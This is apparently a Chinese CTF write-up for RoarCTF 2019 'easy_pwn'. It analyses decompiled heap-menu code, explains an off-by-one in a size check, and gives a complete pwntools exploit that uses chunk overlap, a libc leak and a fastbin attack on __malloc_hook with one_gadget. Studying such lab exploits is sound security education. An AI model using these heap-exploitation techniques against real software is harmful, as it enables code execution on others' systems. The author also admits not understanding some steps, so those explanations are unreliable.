---
title: roarctf 2019 easypwn
date: 2020-04-19 23:36:25
tags:
---
这个题就是一直耿耿于怀的题，做了3天，还是看着别人exp才搞出来的<!--more-->   
分析一下伪代码，函数已重命名  
```cpp  
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+4h] [rbp-Ch]
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  sub_AD0(a1, a2, a3);
  while ( 1 )
  {
    menu();
    v4 = get_number(v4);
    switch ( &savedregs )
    {
      case 1u:
        add();
        break;
      case 2u:
        puts("Tell me the secret about you!!");
        edit();
        break;
      case 3u:
        delete();
        break;
      case 4u:
        show();
        break;
      case 5u:
        return 0LL;
      default:
        puts("Wrong try again!!");
        break;
    }
  }
}
```  
```cpp  
__int64 add()
{
  __int64 result; // rax
  int v1; // ST0C_4
  unsigned int i; // [rsp+4h] [rbp-1Ch]
  int v3; // [rsp+8h] [rbp-18h]
  signed int v4; // [rsp+8h] [rbp-18h]
  void *v5; // [rsp+10h] [rbp-10h]

  result = 0LL;
  for ( i = 0; i <= 15; ++i )
  {
    result = *(&unk_202040 + 4 * i);
    if ( !result )
    {
      printf("size: ");
      v4 = get_number(v3);
      if ( v4 > 0 )
      {
        if ( v4 > 4096 )
          v4 = 4096;
        v5 = calloc(v4, 1uLL);
        if ( !v5 )
          exit(-1);
        *(&unk_202040 + 4 * i) = 1;
        *(&unk_202044 + 4 * i) = v4;
        qword_202048[2 * i] = v5;
        v1 = qword_202048[2 * i] & 0xFFF;
        printf("the index of ticket is %d \n", i);
      }
      return i;
    }
  }
  return result;
}
```  
```C++  
__int64 edit()
{
  int v1; // [rsp+Ch] [rbp-14h]
  signed int v2; // [rsp+Ch] [rbp-14h]
  signed int v3; // [rsp+10h] [rbp-10h]
  int v4; // [rsp+14h] [rbp-Ch]

  printf("index: ");
  v2 = get_number(v1);
  v3 = v2;
  if ( v2 >= 0 && v2 <= 15 )
  {
    v2 = *(&unk_202040 + 4 * v2);
    if ( v2 == 1 )
    {
      printf("size: ");
      v2 = get_number(1);
      v4 = check_size(*(&unk_202044 + 4 * v3), v2);
      if ( v2 > 0 )
      {
        printf("content: ", v2);
        v2 = get_content(qword_202048[2 * v3], v4);
      }
    }
  }
  return v2;
}
```  
```C++  
__int64 delete()
{
  int v0; // eax
  int v2; // [rsp+Ch] [rbp-14h]
  int v3; // [rsp+10h] [rbp-10h]
  __int64 v4; // [rsp+10h] [rbp-10h]

  printf("index: ");
  v0 = get_number(v3);
  v4 = v0;
  v2 = v0;
  if ( v0 >= 0LL && v0 <= 15LL )
  {
    v4 = *(&unk_202040 + 4 * v0);
    if ( v4 == 1 )
    {
      *(&unk_202040 + 4 * v0) = 0;
      *(&unk_202044 + 4 * v0) = 0;
      free(qword_202048[2 * v0]);
      qword_202048[2 * v2] = 0LL;
    }
  }
  return v4;
}
```   
```cpp  
__int64 show()
{
  int v1; // [rsp+0h] [rbp-10h]
  __int64 v2; // [rsp+0h] [rbp-10h]

  printf("index: ");
  LODWORD(v2) = get_number(v1);
  HIDWORD(v2) = v2;
  if ( v2 >= 0 && v2 <= 15 )
  {
    LODWORD(v2) = *(&unk_202040 + 4 * v2);
    if ( v2 == 1 )
    {
      printf("content: ", v2);
      LODWORD(v2) = puts_content(qword_202048[2 * SHIDWORD(v2)], *(&unk_202044 + 4 * SHIDWORD(v2)));
    }
  }
  return v2;
}
```  
delete函数，指针已置零，无UAF  
最重要的是check_size函数  
```cpp  
__int64 __fastcall sub_E26(signed int a1, unsigned int a2)
{
  __int64 result; // rax

  if ( a1 > a2 )
    return a2;
  if ( a2 - a1 == 10 )
    LODWORD(result) = a1 + 1;
  else
    LODWORD(result) = a1;
  return result;
}
```  
一开始我不知道这里是什么意思，看了半天才明白，这里是说，edit时输入的size如果比add输入的size大10的话，edit就会多读入一个字节，造成off by one漏洞  
那这题就很明确了，利用off by one + fastbin attack打malloc_hook  
还有一点需要注意的是，这题直接用onegadget没办法打，满足不了one_gadget需要满足的条件，所以需要用realloc函数来调整栈环境  
思路：  
①add 7个chunk，index从0-6
②利用off by one，通过edit chunk0，把chunk1的size改了，让chunk1包含chunk2，造成overlap  
③free chunk1，然后再add回原size的chunk1，此时chunk2中会出现main_arena+88的地址，且chunk2处于inuse状态（原因未知），直接show，就能leak出libc_base  
④edit chunk4，利用obo将chunk6包含进chunk5
⑤free chunk5、chunk6  
⑥将chunk5 add回来，此时应该拥有了一块包含chunk6的chunk5  
⑦edit chunk5，将malloc_hook-0x23写到chunk6的fd位  
⑧free chunk6，此时fastbin中，对应的原chunk_size处的指针指向malloc_hook-0x23  
⑨add 两块chunk，就能分配到一个地址为malloc_hook-0x23的chunk  
⑩将malloc_hook改one_gadget，一把梭gg  
exp：  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './roarctf_2019_easy_pwn' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",25768)
elf=ELF(binary)
libc=elf.libc
def add(size):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("size: ")
    p.sendline(str(size))
def edit(index,size,content):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(index))
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("content: ")
    p.sendline(str(content))
def free(index):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(index))
def show(index):
    p.recvuntil("choice: ")
    p.sendline("4")
    p.recvuntil("index: ")
    p.sendline(str(index))
def exp():
    add(0x18) # 0
    add(0x68) # 1
    add(0x68) # 2
    add(0x68) # 3
    add(0x68) # 4
    add(0x68) # 5
    add(0x68) # 6
    payload = "a"*0x18 + p8(0xe1)
    edit(0,0x22,payload)
    free(1)
    add(0x68) # 1
    
    show(2)
    libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3c4b78  # leak libc_base
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc = libc_base + libc.sym['realloc']
    one_gadget = libc_base + 0x4526a
    log.success("libc_base==>" + hex(libc_base))
    log.success("malloc_hook==>" + hex(malloc_hook))
    log.success("realloc==>" + hex(realloc))
    log.success("one_gadget==>" + hex(one_gadget))
    
    payload = "a"*0x68 + p8(0xe1)
    edit(4,0x68+10,payload)
    free(5)
    free(6)
    add(0xd0) # 5
    payload = "a"*0x68 + p64(0x71) + p64(malloc_hook-0x23)
    payload += "b"*(0xd0-len(payload))
    edit(5,0xd0,payload)
    free(6)
    add(0x68) # 6
    add(0x68) # 7
    payload = "a"*0xb + p64(one_gadget) + p64(realloc+13)
    payload = payload.ljust(0x68,"\x00")
    edit(7,0x68,payload)
    add(0x10)

    p.interactive()
exp()
```  
问：不是距离malloc_hook-0x23吗，去掉chunk头，需要填充0x13，为什么填充0x13-8呢？  
答：realloc_hook在malloc_hook上方，我们将onegadget写入了realloc_hook中，将realloc写入了malloc_hook中，这样调用malloc时就相当于调用了malloc_hook，就相当于调用了realloc，就相当于调用了realloc_hook，就相当于调用了one_gadget  
![](easypwn1.png)  
问：一开始泄露地址时为什么free(1)之后又add(0x68)，main_arena+88就在chunk2中了？  
答：add(0x68)好像实质上是malloc了chunk2回来，具体不是很清楚，只是不断调试发现正好是这样的，就show了  
free掉1之后是这样的  
![](easypwn2.png)  
add回来之后长这样  
![](easypwn3.png)  
尝试性show了一下chunk2发现可以leak  
  
本来想着这个题还要用什么realloc，有点麻烦，所以想打free_hook的，但是看了看，free_hook更麻烦，还要写0x7f什么的，理解不了，不大会  
等学会了来打一下free_hook（挖坑待填）    
参考链接：  
https://blog.csdn.net/weixin_44145820/article/details/104839805  
https://nocbtm.github.io/2019/10/14/2019-RoarCTF-pwn-writeup  
https://binlep.github.io/2020/01/12/%E3%80%90WriteUp%E3%80%91RoarCTF%202019--Pwn%E9%A2%98%E8%A7%A3/  
https://www.cnblogs.com/luoleqi/p/12380696.html  
http://www.pwn4fun.com/pwn/buuctf-pwn-writeup-part2.html#roarctf2019easypwn  